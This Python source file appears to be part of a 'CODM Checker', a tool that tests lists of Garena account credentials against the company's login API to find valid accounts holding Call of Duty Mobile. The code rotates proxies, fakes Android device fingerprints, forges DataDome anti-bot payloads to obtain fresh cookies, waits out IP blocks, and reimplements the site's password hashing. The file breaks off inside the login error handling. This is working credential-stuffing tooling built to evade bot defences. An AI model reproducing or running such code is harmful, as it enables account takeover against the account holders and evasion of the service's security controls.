import os
import sys
import time
import random
import hashlib
import uuid
import base64
from datetime import datetime, timezone
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich import box

colorama.init(autoreset=True)

console = Console()

BOT_MODE = False

shutdown_event = Event()

PROXY_FOLDER = "proxy"

def backoff(attempt: int, base: float = 0.5, cap: float = 3.0) -> None:
    delay = min(base * (2 ** attempt), cap)
    time.sleep(delay)

class GeoRotator:

    def __init__(self):
        self._lock       = threading.Lock()
        self._file_idx   = 0
        self._proxies    = []
        self._thread_idx = {}
        self._global_idx = 0

        self._proxy_files = self._discover_files()
        if not self._proxy_files:
            logging.getLogger(__name__).warning(
                f"[GEO] No .txt files in ./{PROXY_FOLDER}/ running without proxy!"
            )
        else:
            self._load_file(0)

    def _discover_files(self):
        if not os.path.isdir(PROXY_FOLDER):
            os.makedirs(PROXY_FOLDER, exist_ok=True)
            logging.getLogger(__name__).warning(
                f"[GEO] Created ./{PROXY_FOLDER}/ place proxy .txt files there."
            )
            return []
        files = sorted([
            os.path.join(PROXY_FOLDER, f)
            for f in os.listdir(PROXY_FOLDER)
            if f.lower().endswith(".txt")
        ])
        logging.getLogger(__name__).info(
            f"[GEO] {len(files)} proxy file(s): {[os.path.basename(f) for f in files]}"
        )
        return files

    def _load_file(self, idx):
        if not self._proxy_files:
            return False
        filepath = self._proxy_files[idx % len(self._proxy_files)]
        proxies = []
        try:
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "://" not in line:
                        line = "http://" + line
                    proxies.append(line)
        except Exception:
            pass
        if proxies:
            random.shuffle(proxies)
            self._proxies    = proxies
            self._thread_idx = {}
            logging.getLogger(__name__).info(
                f"[GEO] {len(proxies)} proxies from {os.path.basename(filepath)}"
            )
            return True
        logging.getLogger(__name__).warning(
            f"[GEO] {os.path.basename(filepath)} is empty."
        )
        return False

    def _get_thread_idx(self):
        tid = threading.get_ident()
        with self._lock:
            if tid not in self._thread_idx:
                self._thread_idx[tid] = self._global_idx % len(self._proxies) if self._proxies else 0
                self._global_idx += 1
            return self._thread_idx[tid]

    def _advance_thread(self):
        tid = threading.get_ident()
        with self._lock:
            if not self._proxies:
                return None
            current = self._thread_idx.get(tid, 0)
            new_idx = current + 1
            if new_idx >= len(self._proxies):
                old_name = os.path.basename(self._proxy_files[self._file_idx % len(self._proxy_files)])
                if len(self._proxy_files) > 1:
                    self._file_idx += 1
                    next_name = os.path.basename(self._proxy_files[self._file_idx % len(self._proxy_files)])
                    logging.getLogger(__name__).warning(
                        f"[GEO] {old_name} exhausted switching to {next_name}"
                    )
                else:
                    logging.getLogger(__name__).warning(
                        f"[GEO] {old_name} exhausted looping back to start"
                    )
                self._load_file(self._file_idx)
                new_idx = 0
            self._thread_idx[tid] = new_idx
            return self._proxies[new_idx] if self._proxies else None

    def get_proxies(self):
        if not self._proxies:
            return {}
        idx = self._get_thread_idx()
        return {"http": self._proxies[idx], "https": self._proxies[idx]}

    def force_rotate(self):
        if not self._proxies:
            return None
        proxy_url = self._advance_thread()
        logging.getLogger(__name__).info(f"[GEO] Rotated {proxy_url}")
        return proxy_url

    @property
    def current_proxy(self):
        if not self._proxies:
            return None
        idx = self._get_thread_idx()
        return self._proxies[idx]

    @property
    def total(self):
        return len(self._proxies)

geo_rotator = GeoRotator()

_ANDROID_DEVICES = [
    ("SM-S928B",  "AP3A.241005.015"),  ("SM-S926B",  "AP2A.240905.003"),
    ("SM-S918B",  "UP1A.231005.007"),  ("SM-S911B",  "UP1A.231005.007"),
    ("SM-S906B",  "SP1A.210812.016"),  ("SM-S901B",  "SP1A.210812.016"),
    ("SM-G991B",  "UP1A.231005.007"),  ("SM-A546B",  "UP1A.231005.007"),
    ("SM-A156B",  "AP2A.240805.005"),  ("SM-A536B",  "SP1A.210812.016"),
    ("SM-A346B",  "TP1A.220624.014"),  ("SM-A245F",  "TP1A.220624.014"),
    ("SM-A235F",  "TP1A.220624.014"),  ("SM-A135F",  "TP1A.220624.014"),
    ("Pixel 9 Pro",  "AP4A.250205.002"), ("Pixel 8",   "AP2A.240905.003"),
    ("Pixel 7a",     "UP1A.231005.007"), ("Pixel 7",   "TQ3A.230901.001"),
    ("Pixel 6a",     "TP1A.220905.004"), ("Pixel 5",   "RD1A.200810.022"),
    ("Pixel 4",      "PQ3A.190801.002"),
    ("23127PN0CG",  "AP2A.240905.003"),  ("23049PCD8G", "UKQ1.230804.001"),
    ("2312DRA50G",  "UKQ1.230804.001"),  ("23021RAAEG", "AQ3A.240829.003"),
    ("2201116SG",   "UP1A.231005.007"),  ("22041219PG", "AP1A.240505.005"),
    ("22021211RG",  "TP1A.220624.014"),  ("2211133G",   "UP1A.231005.007"),
    ("21091116AI",  "TKQ1.221114.001"),  ("M2102J20SG", "RKQ1.211001.001"),
    ("M2101K6G",    "AP1A.240405.002"),  ("23053RN02A", "UKQ1.230804.001"),
    ("22120RN86G",  "TKQ1.221114.001"),  ("21121119SG", "TKQ1.221114.001"),
    ("220333QAG",   "TKQ1.221114.001"),
    ("CPH2609",  "TP1A.220624.014"),  ("CPH2591",  "AP2A.240805.005"),
    ("CPH2551",  "TP1A.220624.014"),  ("CPH2385",  "SP1A.210812.016"),
    ("CPH2269",  "RP1A.200720.011"),  ("V2307",    "TP1A.220624.014"),
    ("V2254A",   "UP1A.231005.007"),  ("V2219",    "SP1A.210812.016"),
    ("V2109",    "RP1A.200720.011"),  ("V2038",    "RP1A.200720.011"),
    ("RMX3771",  "AP1A.240405.002"),  ("RMX3686",  "TP1A.220624.014"),
    ("RMX3521",  "SP1A.210812.016"),  ("RMX3393",  "SP1A.210812.016"),
    ("RMX3031",  "RP1A.200720.011"),  ("RMX2195",  "RP1A.200720.011"),
    ("CPH2449",  "TP1A.220624.014"),
    ("LE2125",   "AP1A.240505.005"),  ("LE2115",   "SP1A.210812.016"),
    ("IN2025",   "UP1A.231005.007"),  ("IN2013",   "RP1A.200720.011"),
    ("KB2003",   "AP2A.240805.005"),
    ("POCO X5 Pro",  "TKQ1.221114.001"), ("POCO F4",      "TKQ1.221114.001"),
    ("POCO M4 Pro",  "SP1A.210812.016"), ("POCO X4 GT",   "TP1A.220624.014"),
    ("moto g84 5G",  "UKQ1.230917.001"), ("moto g72",     "T2RLS33.69-23-6"),
    ("moto e32",     "SRPWS31.Q3-46-39"),("XT2153-1",     "RPBS31.Q3-46-37"),
    ("Lenovo TB-9707F", "AP3A.240905.015.A2"), ("Lenovo K13 Note", "RP1A.200720.011"),
    ("Nokia G60",  "TP1A.220624.014"),  ("Nokia X30",  "TP1A.220624.014"),
    ("Nokia C32",  "TP1A.220624.014"),
    ("X6833B",    "TP1A.220624.014"),  ("X6515",    "SP1A.210812.016"),
    ("X669C",     "RP1A.200720.011"),
    ("TECNO KI7",   "TP1A.220624.014"), ("TECNO LG7n",  "TP1A.220624.014"),
    ("XQ-BE52",   "TP1A.220624.014"),  ("XQ-DC54",  "UP1A.231005.007"),
    ("ASUS_AI2205",  "TKQ1.221114.001"), ("ASUS_I006D",   "SP1A.210812.016"),
    ("ZTE Blade A73 5G", "SP1A.210812.016"), ("nubia Z50S Pro", "TP1A.220624.014"),
    ("ELS-NX9",   "HUAWEIELS-NX9"),    ("MAR-LX1B",  "HUAWEIMAR-LX1B"),
    ("VOG-L29",   "HUAWEIVOG-L29"),
]

_CHROME_VERSIONS = [
    "130.0.6723.86",  "131.0.6778.104", "132.0.6834.110",
    "133.0.6917.92",  "134.0.6998.85",  "135.0.7049.100",
    "136.0.7103.60",  "137.0.7151.78",  "138.0.7204.100",
    "139.0.7258.60",  "140.0.7294.92",  "141.0.7328.86",
    "142.0.7381.100", "143.0.7440.50",  "144.0.7559.59",
]

_ANDROID_VERSIONS  = [11, 12, 13, 14, 15]
_GARENA_SDK_VERSION = "5.12.1"


class DeviceManager:
    
    def __init__(self):
        self._idx  = 0
        self._lock = threading.Lock()

    def get_next(self) -> dict:
        with self._lock:
            device, build = _ANDROID_DEVICES[self._idx % len(_ANDROID_DEVICES)]
            self._idx += 1
        chrome       = random.choice(_CHROME_VERSIONS)
        android      = random.choice(_ANDROID_VERSIONS)
        chrome_major = chrome.split(".")[0]
        dev_id       = f"02-{uuid.uuid4()}"
        ua_full = (
            f"Mozilla/5.0 (Linux; Android {android}; {device} "
            f"Build/{build}; wv) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Version/4.0 "
            f"Chrome/{chrome} Mobile Safari/537.36; "
            f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
        )
        return {
            "device": device, "build": build,
            "android": android, "chrome": chrome,
            "chrome_major": chrome_major,
            "device_id": dev_id,
            "ua_full": ua_full,
            "ua_short": f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)",
        }

    def get_random(self) -> dict:
        device, build = random.choice(_ANDROID_DEVICES)
        chrome        = random.choice(_CHROME_VERSIONS)
        android       = random.choice(_ANDROID_VERSIONS)
        chrome_major  = chrome.split(".")[0]
        dev_id        = f"02-{uuid.uuid4()}"
        ua_full = (
            f"Mozilla/5.0 (Linux; Android {android}; {device} "
            f"Build/{build}; wv) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Version/4.0 "
            f"Chrome/{chrome} Mobile Safari/537.36; "
            f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
        )
        return {
            "device": device, "build": build,
            "android": android, "chrome": chrome,
            "chrome_major": chrome_major,
            "device_id": dev_id,
            "ua_full": ua_full,
            "ua_short": f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)",
        }


_device_manager = DeviceManager()

def signal_handler(signum, frame):
    print(f"\n")
    print(f"  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    print(f"  {Colors.YELLOW}Interrupted by user - Exiting immediately{Colors.RESET}")
    print(f"  {Colors.WHITE}   Thanks for using CODM Checker!{Colors.RESET}")
    print(f"  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    print()
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler) 

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    LIGHTCYAN_EX = colorama.Fore.LIGHTCYAN_EX
    LIGHTYELLOW_EX = colorama.Fore.LIGHTYELLOW_EX
    LIGHTRED_EX = colorama.Fore.LIGHTRED_EX
    LIGHTBLUE_EX = colorama.Fore.LIGHTBLUE_EX
    LIGHTWHITE_EX = colorama.Fore.LIGHTWHITE_EX
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    MAGENTA = colorama.Fore.MAGENTA
    RESET = colorama.Style.RESET_ALL

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)   

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[INFO] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[INFO] Current IP: {original_ip}")
        logger.info(f"[INFO] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[INFO] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[INFO] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        logger.warning(f"[WARNING] 403 received (attempt {self._403_attempts}) fetching new DataDome cookie immediately...")

        
        new_datadome = get_datadome_cookie(session)
        if new_datadome:
            self.set_datadome(new_datadome)
            self.set_session_datadome(session, new_datadome)
            self._403_attempts = 0
            logger.info(f"[SUCCESS] Fresh DataDome cookie obtained 403 resolved")
            return True

        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts fresh cookie fetch also failed.")
            logger.error(f"[INFO] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[INFO] Auto-detecting IP change...")

            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                self._403_attempts = 0
                new_datadome2 = get_datadome_cookie(session)
                if new_datadome2:
                    self.set_datadome(new_datadome2)
                    self.set_session_datadome(session, new_datadome2)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained after IP change")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            self.total_processed += 1
            
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1
                
    def should_display(self):
        with self.lock:
            return self.total_processed % 20 == 0
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed
            }
            
    def display_stats(self):
        stats = self.get_stats()
        
        cyan = '\033[1;96m'
        white = '\033[1;37m'
        green = '\033[1;92m'
        red = '\033[1;91m'
        blue = '\033[1;94m'
        magenta = '\033[1;95m'
        yellow = '\033[1;93m'
        gray = '\033[90m'
        reset = '\033[0m'
        
        success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
        
        return (
            f"\n{cyan}╔═══════════════════════════════════════════════════════════════════╗{reset}\n"
            f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}CODM Checker{reset}                       {cyan}║{reset}\n"
            f"{cyan}╠═══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {white}Processed: {magenta}{stats['total']:>4}{reset} {gray}│{reset} "
            f"{white}Success Rate: {green if success_rate >= 50 else red}{success_rate:>5.1f}%{reset}                   {cyan}║{reset}\n"
            f"{cyan}╠═══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {green}Valid: {stats['valid']:>4}{reset} {gray}│{reset} "
            f"{red}Invalid: {stats['invalid']:>4}{reset} {gray}│{reset} "
            f"{blue}Clean: {stats['clean']:>4}{reset} {gray}│{reset} "
            f"{yellow}Not Clean: {stats['not_clean']:>4}{reset}  {cyan}║{reset}\n"
            f"{cyan}║{reset}  {magenta}CODM: {stats['has_codm']:>4}{reset} {gray}│{reset} "
            f"{gray}No CODM: {stats['no_codm']:>4}{reset}                                  {cyan}║{reset}\n"
            f"{cyan}╚═══════════════════════════════════════════════════════════════════╝{reset}\n"
        )

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]


def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()


def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)


def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None
    
def prelogin(session, account, datadome_manager, telegram_config=None):

    url = 'https://100082.connect.garena.com/api/prelogin'
    
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        logger.warning(f"   Skipping: {account} (unsupported characters)")
        return None, None, None
    
    params = {
        'app_id': '100082',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            
            dev = _device_manager.get_next()
            headers = {
                "user-agent":        dev["ua_full"],
                "accept":            "application/json, text/plain, */*",
                "accept-encoding":   "gzip, deflate, br, zstd",
                "accept-language":   "en-US,en;q=0.9",
                "connection":        "keep-alive",
                "host":              "100082.connect.garena.com",
                "sec-ch-ua": (
                    f'"Chromium";v="{dev["chrome_major"]}", '
                    f'"Not(A:Brand";v="8", '
                    f'"Android WebView";v="{dev["chrome_major"]}"'
                ),
                "sec-ch-ua-mobile":   "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-origin",
                "x-requested-with":   "com.garena.game.codm",
                "referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
                    "&response_type=code"
                ),
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            if attempt > 0:
                logger.info(f"      Retry {attempt + 1}/{retries}")
            
            response = session.get(url, headers=headers, params=params, timeout=12)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                
                fresh_dd = get_datadome_cookie(session)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                    new_datadome = fresh_dd
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                
                return "IP_BLOCKED", None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      Invalid response format")
                logger.error(f"      Could not parse server response")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"      Error: {data['error']}")
                logger.error(f"      Server returned an error")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"      Missing authentication data")
                logger.error(f"      Incomplete server response")
                return None, None, new_datadome
                
            logger.info(f"   Prelogin successful")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"      Access denied (403)")
                    logger.error(f"      Security check triggered")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"      Retrying with new cookies...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"      IP blocked - cannot continue")
